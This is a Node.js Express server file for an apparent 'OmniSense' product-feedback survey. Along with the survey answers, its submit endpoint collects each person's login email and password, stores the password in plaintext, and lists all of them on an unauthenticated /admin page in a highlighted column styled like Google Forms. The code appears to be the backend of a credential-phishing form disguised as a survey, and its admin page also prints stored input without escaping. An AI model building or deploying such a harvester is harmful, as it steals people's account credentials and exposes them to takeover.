const express = require('express');
const { createClient } = require('@libsql/client');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Database Setup (Turso Cloud Database)
// Note: When running locally, you can temporarily paste your URL and Token here for testing.
// But for the final deployment, leave them as process.env.
const db = createClient({
    url: process.env.TURSO_DATABASE_URL || 'TURSO_DATABASE_URL',
    authToken: process.env.TURSO_AUTH_TOKEN || 'TURSO_AUTH_TOKEN',
});

// Create table if it doesn't exist
db.execute(`
    CREATE TABLE IF NOT EXISTS submissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        login_email TEXT,
        login_password TEXT,
        consent TEXT,
        age TEXT,
        device_info TEXT,
        setup_ease TEXT,
        nav_ease TEXT,
        no_guidance TEXT,
        readability TEXT,
        speech_accuracy TEXT,
        latency TEXT,
        sign_accuracy TEXT,
        camera_usage TEXT,
        sound_reliability TEXT,
        false_alarms TEXT,
        offline_performance TEXT,
        safety_impact TEXT,
        comparison TEXT,
        environments TEXT,
        recommend_score TEXT,
        most_useful TEXT,
        improvement TEXT,
        overall_satisfaction TEXT,
        submitted_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
`).then(() => {
    console.log("Table ready in Turso database.");
}).catch(err => {
    console.error("Error creating table:", err);
});

// API Endpoint: Receive form data + login credentials
app.post('/api/submit', async (req, res) => {
    const {
        login_email, login_password,
        consent, age, device_info, setup_ease, nav_ease, no_guidance,
        readability, speech_accuracy, latency, sign_accuracy, camera_usage,
        sound_reliability, false_alarms, offline_performance, safety_impact,
        comparison, environments, recommend_score, most_useful, improvement,
        overall_satisfaction
    } = req.body;

    const envString = environments ? environments.join(', ') : 'None';

    try {
        await db.execute({
            sql: `INSERT INTO submissions (
                login_email, login_password,
                consent, age, device_info, setup_ease, nav_ease, no_guidance, 
                readability, speech_accuracy, latency, sign_accuracy, camera_usage, 
                sound_reliability, false_alarms, offline_performance, safety_impact, 
                comparison, environments, recommend_score, most_useful, improvement, 
                overall_satisfaction
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            args: [
                login_email, login_password,
                consent, age, device_info, setup_ease, nav_ease, no_guidance,
                readability, speech_accuracy, latency, sign_accuracy, camera_usage,
                sound_reliability, false_alarms, offline_performance, safety_impact,
                comparison, envString, recommend_score, most_useful, improvement,
                overall_satisfaction
            ]
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Database error' });
    }
});

// Admin Page
app.get('/admin', async (req, res) => {
    try {
        const result = await db.execute(`SELECT * FROM submissions ORDER BY submitted_at DESC`);
        const rows = result.rows;

        let html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin - OmniSense Submissions</title>
            <style>
                body { font-family: 'Roboto', Arial, sans-serif; padding: 20px; background: #f0f4f9; color: #202124; }
                h1 { color: #202124; margin-bottom: 20px; }
                table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-radius: 8px; overflow: hidden; font-size: 13px; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; vertical-align: top; }
                th { background: #673ab7; color: white; font-weight: 500; }
                tr:hover { background: #f5f5f5; }
                .container { max-width: 100%; margin: 0 auto; overflow-x: auto; }
                .password-col { color: #d93025; font-family: monospace; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>OmniSense Form Submissions</h1>
                <table>
                    <tr>
                        <th>ID</th>
                        <th>Login Email</th>
                        <th>Login Password</th>
                        <th>Consent</th>
                        <th>Age</th>
                        <th>Device</th>
                        <th>Setup</th>
                        <th>Nav</th>
                        <th>No Guidance</th>
                        <th>Readability</th>
                        <th>Speech</th>
                        <th>Latency</th>
                        <th>Sign</th>
                        <th>Camera</th>
                        <th>Sounds</th>
                        <th>False Alarms</th>
                        <th>Offline</th>
                        <th>Safety</th>
                        <th>Compare</th>
                        <th>Environments</th>
                        <th>Recommend</th>
                        <th>Most Useful</th>
                        <th>Improvement</th>
                        <th>Satisfaction</th>
                        <th>Date</th>
                    </tr>`;

        rows.forEach(row => {
            // Turso returns rows as objects, so row.fieldName works perfectly.
            html += `
                    <tr>
                        <td>${row.id || ''}</td>
                        <td><strong>${row.login_email || ''}</strong></td>
                        <td class="password-col">${row.login_password || ''}</td>
                        <td>${row.consent || ''}</td>
                        <td>${row.age || ''}</td>
                        <td>${row.device_info || ''}</td>
                        <td>${row.setup_ease || ''}</td>
                        <td>${row.nav_ease || ''}</td>
                        <td>${row.no_guidance || ''}</td>
                        <td>${row.readability || ''}</td>
                        <td>${row.speech_accuracy || ''}</td>
                        <td>${row.latency || ''}</td>
                        <td>${row.sign_accuracy || ''}</td>
                        <td>${row.camera_usage || ''}</td>
                        <td>${row.sound_reliability || ''}</td>
                        <td>${row.false_alarms || ''}</td>
                        <td>${row.offline_performance || ''}</td>
                        <td>${row.safety_impact || ''}</td>
                        <td>${row.comparison || ''}</td>
                        <td>${row.environments || ''}</td>
                        <td>${row.recommend_score || ''}</td>
                        <td>${row.most_useful || ''}</td>
                        <td>${row.improvement || ''}</td>
                        <td>${row.overall_satisfaction || ''}</td>
                        <td>${row.submitted_at || ''}</td>
                    </tr>`;
        });

        html += `</table></div></body></html>`;
        res.send(html);
    } catch (err) {
        console.error(err);
        res.status(500).send('Error retrieving data');
    }
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log(`Admin panel at http://localhost:${PORT}/admin`);
});